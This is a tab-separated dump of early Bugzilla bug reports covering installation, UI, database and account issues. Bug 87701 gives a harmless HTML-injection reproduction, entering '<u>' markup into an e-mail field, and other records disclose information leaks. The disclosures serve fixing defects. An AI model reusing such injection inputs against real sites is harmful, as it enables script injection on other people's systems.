86051%TAB%992559651%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%Cannot change capitalisation of Components or Products,Cannot change capitalisation of Components/Products/Keywords/Groups,Cannot change capitalisation of Products,Cannot change capitalisation of products%TAB%Cannot change capitalisation of Components or Products,Cannot change capitalisation of Components/Products/Keywords/Groups,Cannot change capitalisation of Products,Cannot change capitalisation of productsThis is spun off from bug#64192  Because the comparison is case-insensitive when checking for existing component and product names, if you try and change the capitalisation of a component from, say 'test' to 'TEST', bugzilla says the component already exists.
86168%TAB%992615081%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Bugzilla should use template pages instead of hard-coded HTML%TAB%Bugzilla should use template pages instead of hard-coded HTMLRe discussion with Myk, I suggest we start moving the hard-coded HTML code into templates. Myk suggests we use the Template Toolkit ( see http://www.template-toolkit.org/ ) and since he's used it already in bug 84338 and it appears to be stable and supported, why not?  The purpose here is to make Bugzilla's install and customization much easier, and to allow for simpler upgrading, additionally. It does have high impact, of course, but it can be done in phases.
86300%TAB%992754818%TAB%30690%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Multiple usage of potentially uninitialized variables in globals.pl/GetBugLink%TAB%Multiple usage of potentially uninitialized variables in globals.pl/GetBugLinkI am getting the following warnings in my web server (Apache) log file when  running bugzilla locally:  Use of uninitialized value at globals.pl line 795 (#1) Use of uninitialized value at globals.pl line 796 (#1) Use of uninitialized value at globals.pl line 797 (#1) Use of uninitialized value at globals.pl line 799 (#1) Use of uninitialized value at globals.pl line 800 (#1)  This appears to be due to NULLs being returned by the SQL query a few lines  back.  Also occurs on earlier lines 791 and 792 (and causes similar problems within  the value_quote() calls on the next lines.  Further investigation reveals that the reason I am seeing this error is that I  have the text ... see bug <number> ... in my bug description, where <number> is  not a bugnumber existing in the bugzilla database (I was referring back to bug  numbers in a previous database I had migrated from into bugzilla).  GetBugLink should check for this case, and not produce a link if it occurs.
86328%TAB%992785437%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Delete bugs misses longdescs,Deleting bugs doesn't delete dependent records properly%TAB%Delete bugs misses longdescs,Deleting bugs doesn't delete dependent records properlyfter some testing while doing a fix for # I ran sanitycheck and, lo and behold,  Bad value 44 found in longdescs.bug_id  Bad value 45 found in longdescs.bug_id  Bad value 46 found in longdescs.bug_id  Bad value 47 found in longdescs.bug_id  Bad value 48 found in longdescs.bug_id   These bugs are the exact bugs I was testing deletes from. I haven't tried reproducing yet, but a quick look at the code makes it seem quite possible. I don't think anybody has actually turned on delete, and that's why nobody's been bitten, AFAICS (which also explains why shadow db corruption wasn't reported even when using $db->do/query instead of SendSQL).
86397%TAB%992843480%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%Add autosense to attachment,Add autosense to attachment (mime-type)%TAB%Add autosense to attachment,Add autosense to attachment (mime-type)Having to specify the attachment type semse like a waste of time. Why cant  bugzilla just autosense the attachment type. When a browser uploads a file the "Content-Type" is automaticlly send along with  the file ala: Content-Type = image/gif  You can try it at: http://gemal.dk/browserspy/upload.html  And if bugzilla doesn't recieve any contenttype we just ask for it.
86447%TAB%992859861%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%ChangeFieldType doesn't properly support changing to a NOT NULL type%TAB%ChangeFieldType doesn't properly support changing to a NOT NULL typeAs per bug 9352 final comments, ChangeFieldType won't recognize a NOT NULL target type. In doing do, it will always try to realter the table, since it thinks both field types are different (when in truth, the type string isn't parsed properly).  The fix in 9352 triggers this bug, and it shows in checksetup.pl always reporting the following message (no matter how ALTERed the table is):  Updating field type version in table bugs ... old: varchar(64) new: varchar(64) not null
86651%TAB%992932725%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%contrib/cvs-update.sh sets sticky dates%TAB%contrib/cvs-update.sh sets sticky datesWhenever bugzilla is updated via the cvs-update.sh script it sets stick dates on all bugzilla files.  This has the downside that individual files can't be updated (unless the -A tag is used) and changes can't be commited.  What the patch I'm about to upload does is changes it so '-A' gets used when updating (to remove any sticky dates/tags).  It still logs the command w/the -D so that a change can backed out of the running install.
86923%TAB%993032328%TAB%30877%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%More "Use of uninitialized value at ..." errors%TAB%More "Use of uninitialized value at ..." errors
87006%TAB%993056328%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%shadow database gets corrupted frequently%TAB%shadow database gets corrupted frequentlyThe shadow database seems to be getting corrupted frequently on  bugzilla.mozilla.org.  This usually manifests itself in the profiles or  login_cookies tables.  Since b.m.o runs a nightly |syncshadowdb --syncall| and  this corruption seems to be there for a large number of days in a row, this seems  to indicate something is wrong with the "syncall" process.
87236%TAB%993146582%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Document new htaccess procedures.%TAB%Document new htaccess procedures.he new procedures for blocking data need to be documented.  In particular, only data and localconfig need be blocked.  Also, consider whatever happens over at bug #76154.
87398%TAB%993234238%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Installation%TAB%checksetup.pl should warn if not run as root.%TAB%checksetup.pl should warn if not run as root.The localconfig clearly states that if you have a web server group set, you need to run checksetup.pl as root to chown the files.  However, if you run it not as root, it does not give you a warning in this situation.  It should do so.
87404%TAB%993239965%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%Attachments don't work if you need to log in again.,Attachments don't work if you need to log in again,Attachments don't work if you need to log in again or use user matching,Attachments don't work if you need to use user matching%TAB%Attachments don't work if you need to log in again.,Attachments don't work if you need to log in again,Attachments don't work if you need to log in again or use user matching,Attachments don't work if you need to use user matchingI have an IP that rotates between page loads.  For most things, it's just a hassle, but when I tried to upload an attachment the other day, the following happened:  (a) I was logged on, I uploaded the attachment. (b) I then got a log in screen after I did the upload. (c) It then complained I had uploaded an empty attachment.  Apparently the attachment got lost.  I retried and it worked OK the second time (I was lucky with my IP).  Apparently this is difficult or impossible to fix.  But it indicates that cookieless operation doesn't work at all.  If that's the case, we should either fix it (Dave indicated there was alternative ways we could do this since we could detect cookieless operation out front), or detect it and tell them they can't upload attachments.
87405%TAB%993240292%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Change columns on stored query loses title.%TAB%Change columns on stored query loses title.We have a nice snazzy title that appears on stored queries now.  Woohoo!  However, if you hit 'Change Columns' then it gets converted to a big query URL and even though the query title seems to still be in the URL, the title no longer appears on the page.  I believe it should.  It would probably be nice to fix this by just adding an ordering to the end and not convert it to a big query URL.  And while you're in the area, please explain why the big URL has this:  "namedcmd=2.12+Bugzilla+Bugs&newqueryname=2.16+Bugzilla+Bugs"  "2.16 Bugzilla Bugs" is the relevant query, whereas "2.12 Bugzilla Bugs" is a query I haven't had since ... well ... you know ...
87407%TAB%993241965%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Weird screen.,Rotating IP causes problems with buglist.cgi%TAB%Weird screen.,Rotating IP causes problems with buglist.cgiIt seems my wonderful rotating IP is bringing out all manner of Bugzilla bugs today.  Try this one out:  Go to a stored query.  The pondering screen seems to redirect you to a URL that is just "buglist.cgi".  That's bad in itself (not bookmarkable), but at the moment we'll just assume that in the meantime my IP changed.  Hence you'll see a logged out footer.  Click on "Change Several Bugs At Once".  At this point, if you're not lucky enough for your IP to become the right one again, you'll get a log in screen that looks absolutely lovely.
87411%TAB%993249369%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%needed for mod_perl: Bugzilla should be in its own namespace,move global Bugzilla subroutines into modules,move global Bugzilla subroutines into modules (remove CGI.pl and globals.pl)%TAB%needed for mod_perl: Bugzilla should be in its own namespace,move global Bugzilla subroutines into modules,move global Bugzilla subroutines into modules (remove CGI.pl and globals.pl)Richard Walters wrote  (in news://news.mozilla.org:119/uhexcrkll.fsf%40qualcomm.com ):  For one thing, I put all the scripts into a "Bugzilla namespace", by doing a "package Bugzilla".  I stripped out all the subroutines from "CGI.pl" and "globals.pl", putting them into a new file called "Bugzilla.pm" which I put in /etc/httpd/lib/perl/Bugzilla.pm, and load when the web server starts, by having "PerlRequire Bugzilla.pm" in my /etc/httpd/conf/httpd.conf file.  That way they need only be compiled once when the server first starts.  The good news of putting Bugzilla into its own namespace:  It does not pollute the global namespace.  The bad news:  I had to do global search-replaces for all instances of "$::", replacing with "$Bugzilla::".  Same with arrays and hashes.
87567%TAB%993401712%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Better-looking tabs for the userprefs.cgi page%TAB%Better-looking tabs for the userprefs.cgi pageI had an idea how to do something a little prettier with the tabs on the  userprefs.cgi page...  demo is at the above URL.  I'll attach a diff shortly that actually incorporates it into userprefs.cgi
87596%TAB%993442039%TAB%31068%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%improper definition of $::components in globals.pl%TAB%improper definition of $::components in globals.plThe datastructure for $::components looks like this    hash {      scalar "product" => array []   }  however, on line 504, if the product is not defined in the component list, the value for that product gets set to a scalar rather than an anonymous array.  This bug bit me when I was upgrading from 2.10 to 2.12: I had not component defined for a certain product.  Here is the patch that solved it (the patch is made agains the current revision [1.95]):  cvs -z9 -q diff globals.pl (in directory D:\dev\moz\mozilla\webtools\bugzilla\) Index: globals.pl =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/globals.pl,v retrieving revision 1.95 diff -r1.95 globals.pl 504c504 <             $::components{$i} = ""; --- >
87659%TAB%993461607%TAB%29114%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%RegExp in Example 3-6%TAB%RegExp in Example 3-6he example says "   and a "New User RegExp" of "*@velio.com"       "  When I try to use "*@domain.tld" as regexp, I see the following error when I create a new user account:  Software error: /*@domain.tld/: ?+*{} follows nothing in regexp at globals.pl line 598.  The account is created, but added to the group. If I use ".*@domain.tld" instead of "*.domain.tld" the user is added to the correct group
87701%TAB%993473855%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Invalid username in bug changes echoed back without being escaped%TAB%Invalid username in bug changes echoed back without being escapedSteps to reproduce: 1. Go to bug 33830. 2. Try to add <u>@netscape.com to the CC list.  Result: The name @netscape.com is not a valid username.                  --------------------------------------  Expected: The name <u>@netscape.com is not a valid username.  This bug happens with all e-mail address fields, not just with CC.  I think it affects the new-bug form as well as the form for modifying existing bugs. This is a security hole. Fixing bug 26257 would make the security hole less exploitable, but it would still be a bug.
87769%TAB%993502135%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%doeditvotes.cgi can nuke votes%TAB%doeditvotes.cgi can nuke votesMost of the cgis in the product, if you type them in directly with no parameters, would do something reasonable.  However, doeditvotes will trash all your votes.
87770%TAB%993502244%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%createattachment should work with no parameters.,attachment.cgi should work with no parameters%TAB%createattachment should work with no parameters.,attachment.cgi should work with no parametersMost of the cgis in the product, if you type them in directly with no parameters, would do something reasonable.  However, createattachment will give a software error.  It should work like show_bug.cgi which asks for the bug id.
87772%TAB%993502486%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Installation instructions for Mac OS X and Darwin%TAB%Installation instructions for Mac OS X and DarwinBugzilla itself runs just dandy on Mac OS X.  However, if you want to use the  charting features, you need Chart::Base, and GD, and of course libgd.  libgd also  requires libttf, libjpeg, and libxpm.  These items are pretty hard to get working  on Mac OS X if you try to do it on your own.  Fortunately there's Fink, a utility  similar in nature to CPAN but which installs common GNU software.  In order to  avoid creating conflicts with the software Apple installs by default, Fink  creates its own directory tree at /sw where it installs all of its software.   This in turn causes another issue with the GD Perl module because it assumes your  libraries are in /usr/lib instead of getting it from your path.  I'm writing up a little better instructions which I'll be attaching shortly.
87779%TAB%993507123%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Don't automatically create account on login page.%TAB%Don't automatically create account on login page.When someone enters an invalid login, they have an option to e-mail themselves a password.  However, if the account does not exist, it is created.  This is undesirable because useless accounts can be created by accident.  I suggest that we say that the account does not exist, and below that message place the normal createaccount.cgi form (with the email address filled in).  As a bonus, the user will be able to enter their real name at account creation time.  This would of course mean that this code should be refactored so it is usable from all cgis that might want a login, as well as createaccount.cgi.
87795%TAB%993514372%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Prevent account abuse.,Creating an account should wait for confirmation (prevent account abuse),Creating an account should send token and wait for confirmation (prevent user account abuse)%TAB%Prevent account abuse.,Creating an account should wait for confirmation (prevent account abuse),Creating an account should send token and wait for confirmation (prevent user account abuse)We should do something to prevent someone from creating accounts for other people they shouldn't, and those accounts polluting the system.  Two options present themselves:  (1) Put a 'last login date' or 'everloggedin' option on the profiles table.  Then after a specific period, delete the account if it has never been used (and hence can be deleted safely one would hope). (2) Before creating the account, store the email address, real name, password, and a unique token in a temporary table, and send a confirmation email to the user including a validation URL with the token embedded which will create the account.  Either mechanism would require a clean up job to clean up old accounts/tokens.  This could be done in a cron job or it could be tied to another task, for example when an account is created and the cleanup hasn't occurred for a day.  I would prefer option 2.  Unvalidated accounts will take less space, clean up will be faster, the max userid number will be less, and there's no chance a bug might make the account be used somewhere while being marked as never logged in.
87801%TAB%993533013%TAB%8667%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Email%TAB%sendmail results error checking,Better error messages when mail sending fails%TAB%sendmail results error checking,Better error messages when mail sending failsSomeone here was using Bugzilla and had forgotten their password. They filled in their e-mail address and clicked on "E-mail me a password".  The webpage returned back said  "Password has been emailed No recipient addresses found in header The password for the e-mail address  paul.thomas@sse.ie has been e-mailed to that address."  They never got an email!  I looked into it and it turned out that parameter passwordmail has accidently  been saved with an extra newline in the email address and looked like this  From: bu zilla@machine.sse.ie To: %mailaddress% Subject: Your Bugzilla password. ... etc ...  I took out the newline, saved the new parameter and it worked fine.  I reckon that the message "No recipient addresses found in header" was returned  from sendmail, yet "The password for the e-mail address paul.thomas@sse.ie has  been e-mailed to that address" was displayed, so it looks to me as if the  return code from the call the sendmail is not been checked properly.  Although this bug only reveals itself when the system is not set up properly, I  still reckon that any "dodgy" return code checking from sendmail is worth  reporting.
87818%TAB%993542331%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Make Bugzilla support LINK tags for buglists%TAB%Make Bugzilla support LINK tags for buglistsBugzilla should support <LINK rel="[prev|next|contents|first|last|up]" /> for bug lists. This will be useful when the Links Toolbar work in bug 87428 is done.  Patch coming up...  Currently I have both rel="up" and rel="contents" pointing to the buglist page. Does this seem sane?  Gerv
87840%TAB%993547010%TAB%27226%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%[RFE]: Field to point duplication to other target,Field to point duplication to other target,If a bug is marked as a duplicate but is pointing to the wrong bug ID, let me fix the original bug ID without reopening%TAB%[RFE]: Field to point duplication to other target,Field to point duplication to other target,If a bug is marked as a duplicate but is pointing to the wrong bug ID, let me fix the original bug ID without reopeningOften bugs get duplicated and afterwards the duplication is corrected to point to another bug. The given URL is a good example of that. The current way of reopening and marking as duplicate afterwards is rather clumsy. I therefore suggest Adding a field  "Mark bug as duplicate of #[   ]"  to the possible resolutions.
87958%TAB%993580620%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Installation%TAB%Bugzilla should require MySQL 3.23.2,Bugzilla should require MySQL 3.23.x,Bugzilla should require MySQL 3.23.32,Bugzilla should require MySQL 3.23.41%TAB%Bugzilla should require MySQL 3.23.2,Bugzilla should require MySQL 3.23.x,Bugzilla should require MySQL 3.23.32,Bugzilla should require MySQL 3.23.41The mysqldump utility provided with versions of MySQL earlier than 3.23.2 has a  bug in it which causes column indexes with names that match built-in function  names to be encoded in the output in such a way that when re-importing them they  get interpretted as the functions instead of as index names.  This completely  chokes any attempt to restore bugzilla databases from a mysqldump-generated  backup.  In order to protect all the good sysadmins out there that do regular backups (not  to mention sites that use the shadowdb), we should make sure they are using a  version of MySQL that includes the mysqldump that has this fixed.  (That or explicitly name the index on the versions column in the bugs table -  which is another option...)
87976%TAB%993589671%TAB%7346%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,Attachments & Requests%TAB%text/xml should be in default list,application/xml should be in default list,application/xml should be in default list for attachment types%TAB%text/xml should be in default list,application/xml should be in default list,application/xml should be in default list for attachment typesWith XML files getting more and more important I think it is time to add text/xml to the list of file types in the    http://bugzilla.mozilla.org/createattachment.cgi?id=XXXXX  menu.  I know I can use the "Other" field to fill this in but if text/html is there text/xml should be as well.
87983%TAB%993592119%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%backdoor.cgi should be dealt with.%TAB%backdoor.cgi should be dealt with.backdoor.cgi seems to be a Netscape-specific cgi, so we shouldn't be shipping it in the tree.  And I've been told Netscape probably don't even use it anyway now we have bug moving.  Not only that, when I ran it on b.m.o, it didn't know me and it gave me a nice set of information about the system it was running on that could be useful to a system cracker.  It's probably OK on other systems though because on my local installation it falls over before it gets this far.  Let's not scare admins anymore with its name and trash it.
88179%TAB%993679030%TAB%27556%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bug charts broken under Windows (Software Error, Base.pm line173)%TAB%Bug charts broken under Windows (Software Error, Base.pm line173)On my BZ-installation 2.10 the Bug Charts works well (no bug ;-).  But I have another server with the same config (W2K server and IIS) and a BZ  2.13 installation - here the Bug Charts are broken,I think because of the  datasets stuff: a) If I select only one Status of the Chart datasets (eg. REOPENED), I get no  Software Error, but the grafik is borken (.../graphs/-All-_REOPENED%3A.png). b) If i select two or more (eg. NEW and REOPENED) I get a Software Error in  Base.pm line 173).  My collectstats.pl works well - if I take a look in the data/mining-files they  are updated every night. Permissions on the directory are the same as under  BZ2.10 (both: system and IIS). If I take a look in the /graph folder, the files are all about 0KB and have the  name <Product>_<firstState> without! any extension (eg. png). A second state is  never added to any filename (like <Product>_<firstState>_<secondState>.png).  So perhaps, this error results out of the Windows conventions for naming the  files, which are differnt about unix ?  I also started a thread in the NG, but I found nobody with working Bug Charts  (>=BZ2.12) under Windows.
88797%TAB%994050059%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Running a mass change clears group bits.%TAB%Running a mass change clears group bits.the change multiple bugs form calls process_bug.cgi, which now assumes if it  doesn't find anything mentioning groups that everything is being cleared, since  empty checkboxes aren't transmitted.  When we were using select boxes for the  groups, the absense of a select box altogether resulted in no action.  The  easiest way to fix this is probably going to be to create some sort of  "--do_not_change--" value for groups on the mass change page...  If we have to go  this far, maybe we should go ahead and implement being able to change groups from  the mass change page...  (isn't there a bug for that already somewhere?)
89272%TAB%994232727%TAB%9285%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%XP Toolkit/Widgets,Bugzilla Helper,Bugzilla-General%TAB%Resizing "dropdown" menus aren't handled gracefully%TAB%Resizing "dropdown" menus aren't handled gracefullyFrom Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.2+) Gecko/20010703 BuildID:    2001070321  If an option is selected in a dropdown menu (a <select> menu that is) and the menu is resized by items being removed afterwards it will go blank and the list will be much longer than it actually should be.  Reproducible: Always Steps to Reproduce: 1.Go to above URL 2.In "Product" select "Browser or editor" 3.In "Component" select "xpidl" (at the bottom) 4.In "Product" select "Mail/News"   Actual Results:  The "Component" list gets confused. It's longer than it should be (lots of white lines fill out the dropdown menu)  Expected Results:  If currently selected option is removed, mozilla should move to the top of the menu. It should only be blank if *all* options are removed.
90333%TAB%994834477%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bulk change of no bugs gives software error.%TAB%Bulk change of no bugs gives software error.If you try to do a bulk change, don't select any bugs and click Commit you'll get a software error:  Software error:      SELECT bit, bit & 9223372036854775807 != 0, bit & bugs.groupset != 0     FROM groups, bugs     WHERE isbuggroup != 0 AND bug_id =      ORDER BY bit : You have an error in your SQL syntax near 'ORDER BY bit ' at line 4 at globals.pl line 205.
90334%TAB%994834648%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bulk change with an empty bug list shouldn't bring up change paraphenalia..,Do not display the "change several bugs at once" form if there are no bugs in the buglist%TAB%Bulk change with an empty bug list shouldn't bring up change paraphenalia..,Do not display the "change several bugs at once" form if there are no bugs in the buglistIf you try to do a bulk change, and the resulting bug list is empty (either because it's a bookmarked change or you can from the query page and the bugs there just disappeared), all the change paraphenalia shouldn't appear.  It should just say there's no bugs.
90468%TAB%994906445%TAB%32182%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Accounts%TAB%Bugzilla does not log out automatically when closing the session,Implement optional session logout modes for Bugzilla%TAB%Bugzilla does not log out automatically when closing the session,Implement optional session logout modes for BugzillaIf you don't log out explicitly, Bugzilla access is granted in every new Browser session. As we want to uses Buzilla as a ticket tracking sysstem for a variety of customers, we consider this a security hazard.  Is there any trick to change that?
90553%TAB%994937620%TAB%30877%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Wrong URL for MySQL homepage throughout Bugzilla%TAB%Wrong URL for MySQL homepage throughout BugzillaI noticed this a couple of weeks ago and meant to report it then but I forgot  about it until today when a discussion was posted on slashdot.org in regards to  the two sites.  The correct homepage for MySQL is http://www.mysql.com In many places throughout Bugzilla it is listed as http://www.mysql.org  From a cursory inspection of the files.  The following files contain the incorrect URL as of the CVS tree on July 12, 2001.  checksetup.pl docs/html/Bugzilla-Guide.html docs/html/downloadlinks.html docs/html/readme.unix.html docs/sgml/installation.sgml docs/sgml/requiredsoftware.sgml docs/txt/Bugzilla-Guide.txt
90933%TAB%995247362%TAB%32233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%different handling of disabledtext%TAB%different handling of disabledtextcreating a user by using editusers.cgi (administrative) the field disabled text  will be set to '' (because the edit field is empty) Using the login screen (results in globals.pl:InsertNewUser) the field will not  be set and keeps NULL  This results in hang of edit user created in the second way - the details  screen (editusers.cgi?action=edit&user=...) will never be opened  You can fix this by setting disabled text to '' in globals.pl
91037%TAB%995301183%TAB%32379%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%a generic implementation for custom fields,A generic implementation for custom fields%TAB%a generic implementation for custom fields,A generic implementation for custom fieldsThis enhancements allows users to add custom fields to bugzilla. This is  accomplished through 3 new tables on the database side. Enclosed is the current  version (perl patch/schema/setup). Buglist (querying) and processmail still  need to be updated. A nicer front end for adding the custom fields would be  nice too.
91301%TAB%995440015%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Remove all references to README in Bugzilla Guide.%TAB%Remove all references to README in Bugzilla Guide.There are still multiple references to the README file in the Bugzilla guide.  I'm not going to list what I found here because a simple search will likely give a larger list than whatever I include.
91486%TAB%995526672%TAB%21302%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%"changed from" missing from boolean chart%TAB%"changed from" missing from boolean chartFor changes to bugs, we can already do "changed to", "changed by", "changed  before" and "changed after", so why not "changed from", since the information  is available in the same database table anyway?  This allows queries for a specific change e.g. [status] [changed from] [VERIFIED] And [status] [changed to  ] [REOPENED]  Finds bugs that have been reopened from a verified state (as opposed to plain  resolved).  Proposed patch follows...
91664%TAB%995629610%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%Bugzilla does not enforce a maximum patch/attachment size.%TAB%Bugzilla does not enforce a maximum patch/attachment size.Bugzilla does not enforce a maximum patch/attachment size, even though it stores attachments in a LONGBLOB column with a theoretical limit of (2^32 - 1) characters, a practical limit of 16MB based on the maximum value of mysqld's max_allowed_packet, and an actual limit equivalent to the value of that variable.  More significantly, the lack of any size enforcement leads to reckless and wanton uses of space, for example the posting of unnecessary and/or non-compressed attachments (like highest-quality JPEG screen-shots). Bugzilla should enforce a maximum patch/attachment size.
91761%TAB%995708246%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%New group for sanity check.,Sanity Check is too broadly accessible%TAB%New group for sanity check.,Sanity Check is too broadly accessibleWe should introduce a new system group to allow administrators to specify who can perform sanity checks.  In bug #54556 we did a bandaid and made sure you needed editbugs, but I don't think this is sufficient long term.
91808%TAB%995773072%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Sanity check duplicates table.%TAB%Sanity check duplicates table.I added a few referential checks for the new duplicates table to a patch on bug #76140.  However, we could go further.  In particular:  Check that each bug that's been marked duplicate has an entry in the duplicates table. Check that each bug that has an entry in the duplicates table that's been marked duplicate.  In particular the second check goes further than the existing referential check, so maybe it should be removed from the above mentioned patch.  But anyway, rather than doing these two checks separately, I suggest we do them together, in a similar way as a list merge:  (1)  Get a sorted list of bugs marked duplicate as per the bugs table. (2)  Get a sorted list of bugs marked duplicate as per the duplicates table. (3)  Compare the two lists using a similar technique as you would to merge the lists into one sorted list - continually compare the heads.  If both heads are the same, remove them, otherwise remove the lesser head and split out an error.
91903%TAB%995864695%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,Bug Import/Export & Moving%TAB%Insecure dependency in require at importxml.pl line 59.%TAB%Insecure dependency in require at importxml.pl line 59.As reported by tinderbox:  Insecure dependency in require while running with -T switch at /home/ianh/ tinderbox/mozilla/webtools/bugzilla/importxml.pl line 59.  This is only killing the Perl 5.00503 tinderbox.  All the 5.6 tinderboxen are  passing it.  This is a 2.14 release blocker.  Resolution of this bug will require  either making Perl 5.00503 happy or deciding to require a newer version of Perl.
92253%TAB%996042721%TAB%21302%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%Boolean chart makes very wide web pages from query.cgi%TAB%Boolean chart makes very wide web pages from query.cgiIt is difficult to quickly review what is currently in a boolean chart with  lots of OR operators, as the page generated is too wide to fit in a window. It  would be more readable if each OR term was on a different row, but more tightly  packed than the AND terms.  Something roughly along the lines of the way it is shown in queryhelp.cgi.  I patched query.cgi our local bugzilla, and the results seem to look ok to me.
92263%TAB%996046529%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Don't output SQL commands before the footer.%TAB%Don't output SQL commands before the footer.The other day when there was problems with shadow database syncing on mozilla.org, people (including me) were getting an SQL INSERT statement that was an account creation, just before their footer.  This had the account's unencrypted password, as well as the person's email.  Now we don't store cleartext passwords in 2.14, but we still shouldn't be outputting this garbage.  I've been told that apparently it was trying to remove leftover shadow sync commands.  That's all well and good, but it shouldn't be outputting those commands.
92266%TAB%996048019%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%Generate software error if truncation occurs on bugs activity table.%TAB%Generate software error if truncation occurs on bugs activity table.Supposedly there won't be any more truncation "in practice" on the activity table now bug #55161 is fixed, but let's not risk it - we could add heaps of dependencies at once.  We should add an assertion to check it fits, and generate a software error (or a nicer error if you can) if the assertion fails.
92274%TAB%996050404%TAB%32661%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,Incoming Email%TAB%bug_email.pl, assigned_to generation and local addresses,email_in.pl using the From address doesn't work with emailsuffix%TAB%bug_email.pl, assigned_to generation and local addresses,email_in.pl using the From address doesn't work with emailsuffixThe distributed bug_email.pl does not deal with local user names. It requires a complete domain name. Also, if the assigned_to field is omitted from an email, it is not gnerated correctly. Here is the diff to fix both issues:  diff bug_email.pl.orig bug_email.pl 91a92 > my $EmailSender; 444c445 < 	Reply( $SenderShort, $Message_ID, "Bugzilla Error", "Permission denied.\n\n" . --- > 	Reply( $EmailSender, $Message_ID, "Bugzilla Error", "Permission denied.\n\n" . 760a762 > $EmailSender = $SenderShort; 952c954 < $Control{'assigned_to'} = DBname_to_id($Control{'assigned_to'}, $forceAssignedOK); --- > # Already a number !! $Control{'assigned_to'} = DBname_to_id($Control{'assigned_to'}, $forceAssignedOK); 1267c1269 <     Reply( $SenderShort, $Message_ID,"Bugzilla success (ID $id)", $reply ); --- >     Reply( $EmailSender, 